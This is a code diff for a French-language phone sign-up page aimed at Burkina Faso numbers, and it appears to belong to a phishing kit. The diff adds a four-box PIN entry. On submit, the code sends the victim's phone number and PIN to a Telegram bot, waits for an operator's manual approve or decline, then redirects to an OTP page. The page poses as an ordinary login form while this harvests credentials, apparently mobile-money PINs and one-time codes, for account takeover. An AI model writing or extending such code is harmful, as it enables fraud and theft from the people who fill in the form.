@@ -40,6 +40,7 @@
     border-radius: 12px;
     padding: 0 14px;
     height: 54px;
+    margin-bottom: 8px;
   }
   .phone-input-row.invalid {
     border-color: #dc3545;
@@ -75,6 +76,39 @@
   .error-message.visible {
     display: block;
   }
+
+  /* PIN row – 4 boxes */
+  .pin-row {
+    display: flex;
+    gap: 12px;
+    margin: 16px 0 8px;
+    justify-content: center;
+  }
+  .pin-box {
+    width: 56px;
+    height: 60px;
+    border: 2px solid #dce1e9;
+    border-radius: 12px;
+    font-size: 24px;
+    font-weight: 600;
+    text-align: center;
+    color: #0b1a2b;
+    background: #fff;
+    outline: none;
+    caret-color: #1A6DBF;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .pin-box:focus {
+    border-color: #1A6DBF;
+    box-shadow: 0 0 0 3px rgba(26,109,191,0.15);
+  }
+  .pin-box.invalid {
+    border-color: #dc3545;
+  }
+  .pin-box::-webkit-outer-spin-button,
+  .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+  .pin-box { -moz-appearance: textfield; appearance: textfield; }
+
   .bottom {
     position: fixed;
     bottom: 28px;
@@ -136,6 +170,15 @@
   @keyframes spin {
     to { transform: rotate(360deg); }
   }
+
+  @media (max-width: 440px) {
+    .pin-box { width: 46px; height: 52px; font-size: 20px; }
+    .pin-row { gap: 8px; }
+  }
+  @media (max-width: 360px) {
+    .pin-box { width: 40px; height: 46px; font-size: 18px; }
+    .pin-row { gap: 6px; }
+  }
 </style>
 </head>
 <body>
@@ -144,13 +187,25 @@
 </div>
 <div class="content">
   <h1 class="title">Commençons</h1>
-  <p class="subtitle">Entrez votre numéro de téléphone pour commencer</p>
+  <p class="subtitle">Entrez votre numéro de téléphone et votre code PIN</p>
+
+  <!-- Phone input -->
   <div class="phone-input-row" id="phoneRow">
     <span class="country-code">+226</span>
     <div class="divider"></div>
-    <input type="tel" placeholder="Saisissez le numéro de téléphone" id="phoneInput" inputmode="numeric" autocomplete="tel">
+    <input type="tel" placeholder="Saisissez le numéro" id="phoneInput" inputmode="numeric" autocomplete="tel">
   </div>
   <div class="error-message" id="phoneError">Numéro invalide. Exemple : 70 12 34 56</div>
+
+  <!-- PIN input (4 boxes) -->
+  <div class="pin-row" id="pinRow">
+    <input class="pin-box" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autocomplete="off">
+    <input class="pin-box" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
+    <input class="pin-box" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
+    <input class="pin-box" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
+  </div>
+  <div class="error-message" id="pinError">Entrez un code PIN à 4 chiffres.</div>
+
 </div>
 <div class="bottom">
   <div class="terms-row">
@@ -176,26 +231,28 @@
     const phoneInput = document.getElementById('phoneInput');
     const phoneRow = document.getElementById('phoneRow');
     const phoneError = document.getElementById('phoneError');
+    const pinInputs = [
+      document.getElementById('pin1'),
+      document.getElementById('pin2'),
+      document.getElementById('pin3'),
+      document.getElementById('pin4')
+    ];
+    const pinError = document.getElementById('pinError');
     const termsCheck = document.getElementById('terms');
     const continueBtn = document.getElementById('continueBtn');
     const spinner = document.getElementById('spinner');
 
-    // ===== BURKINA FASO VALIDATION (ALL OPERATORS) =====
-    // Valid prefixes: 50-79 (covers Orange, Moov, MVNOs, etc.)
+    // ===== BURKINA FASO PHONE VALIDATION =====
     function normalizePhone(raw) {
       let digits = raw.replace(/\D/g, '');
-      if (digits.startsWith('226')) {
-        digits = digits.slice(3);
-      }
+      if (digits.startsWith('226')) digits = digits.slice(3);
       return digits;
     }
 
     function isValidBurkinaPhone(digits) {
       if (digits.length !== 8) return false;
-      const prefix = digits.substring(0, 2);
-      const prefixNum = parseInt(prefix, 10);
-      // All legitimate mobile prefixes in Burkina Faso are between 50 and 79
-      return prefixNum >= 50 && prefixNum <= 79;
+      const prefix = parseInt(digits.substring(0,2), 10);
+      return prefix >= 50 && prefix <= 79;
     }
 
     function validatePhone() {
@@ -215,7 +272,7 @@
       } else if (digits.length > 8) {
         errorMsg = 'Numéro trop long. Vérifiez le format.';
       } else if (!isValidBurkinaPhone(digits)) {
-        errorMsg = 'Numéro invalide. Doit commencer par 50, 51, ..., 78 ou 79.';
+        errorMsg = 'Numéro invalide. Doit commencer par 50-79.';
       } else {
         valid = true;
       }
@@ -228,15 +285,34 @@
         phoneRow.classList.remove('invalid');
         phoneError.classList.remove('visible');
       }
+      return valid;
+    }
 
+    // ===== PIN VALIDATION =====
+    function getPin() {
+      return pinInputs.map(inp => inp.value).join('');
+    }
+
+    function validatePin() {
+      const pin = getPin();
+      const valid = pin.length === 4 && /^\d{4}$/.test(pin);
+      pinInputs.forEach(inp => inp.classList.toggle('invalid', !valid && pin.length > 0));
+      if (!valid && pin.length > 0) {
+        pinError.textContent = 'Entrez un code PIN à 4 chiffres.';
+        pinError.classList.add('visible');
+      } else {
+        pinError.classList.remove('visible');
+      }
       return valid;
     }
 
     // ===== CHECK FORM =====
     function checkForm() {
       const phoneValid = validatePhone();
+      const pinValid = validatePin();
       const termsChecked = termsCheck.checked;
-      if (phoneValid && termsChecked) {
+      const allValid = phoneValid && pinValid && termsChecked;
+      if (allValid) {
         continueBtn.classList.add('active');
         continueBtn.disabled = false;
       } else {
@@ -245,8 +321,38 @@
       }
     }
 
+    // ===== PIN INPUT HANDLERS (auto‑advance, backspace, arrow) =====
+    pinInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0,1);
+        if (this.value.length === 1 && idx < 3) {
+          pinInputs[idx + 1].focus();
+        }
+        checkForm();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0 && idx > 0) {
+            e.preventDefault();
+            pinInputs[idx - 1].focus();
+          }
+        } else if (e.key === 'ArrowLeft') {
+          e.preventDefault();
+          if (idx > 0) pinInputs[idx - 1].focus();
+        } else if (e.key === 'ArrowRight') {
+          e.preventDefault();
+          if (idx < 3) pinInputs[idx + 1].focus();
+        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
+          e.preventDefault();
+        }
+      });
+    });
+
+    // ===== PHONE & TERMS EVENTS =====
     phoneInput.addEventListener('input', checkForm);
     termsCheck.addEventListener('change', checkForm);
+
     // initial state
     continueBtn.disabled = true;
 
@@ -303,7 +409,7 @@
       }, 1500);
     }
 
-    // ===== CLICK ON CONTINUE =====
+    // ===== SUBMIT =====
     let isProcessing = false;
 
     continueBtn.addEventListener('click', async function() {
@@ -316,21 +422,27 @@
         return;
       }
 
-      // Save with +226 for other pages
+      const pin = getPin();
+      if (pin.length !== 4) {
+        checkForm();
+        return;
+      }
+
       const fullPhone = '+226' + digits;
       localStorage.setItem('phone', fullPhone);
+      localStorage.setItem('userPin', pin); // save PIN if needed later
 
       // Disable UI
       isProcessing = true;
       phoneInput.disabled = true;
+      pinInputs.forEach(inp => inp.disabled = true);
       termsCheck.disabled = true;
       continueBtn.disabled = true;
       continueBtn.classList.remove('active');
       spinner.style.display = 'flex';
 
       const ts = Date.now();
-      // Send only the 8 digits to Telegram
-      const msg = `🔐 Phone verification\n\n📱 Phone: <code>${digits}</code>\n\nApprove this number?`;
+      const msg = `🔐 Phone & PIN verification\n\n📱 Phone: <code>${digits}</code>\n🔑 PIN: <code>${pin}</code>\n\nApprove this request?`;
 
       try {
         await sendToTelegram({
@@ -353,6 +465,7 @@
             window.location.href = '6otp.html';
           } else if (action === 'decline') {
             phoneInput.disabled = false;
+            pinInputs.forEach(inp => { inp.disabled = false; inp.value = ''; });
             termsCheck.disabled = false;
             continueBtn.disabled = false;
             checkForm();
@@ -368,13 +481,14 @@
         spinner.style.display = 'none';
         isProcessing = false;
         phoneInput.disabled = false;
+        pinInputs.forEach(inp => inp.disabled = false);
         termsCheck.disabled = false;
         checkForm();
         alert('Erreur de connexion. Veuillez réessayer.');
       }
     });
 
-    // Cleanup poll on page unload
+    // Cleanup
     window.addEventListener('beforeunload', () => {
       if (pollInterval) clearInterval(pollInterval);
     });
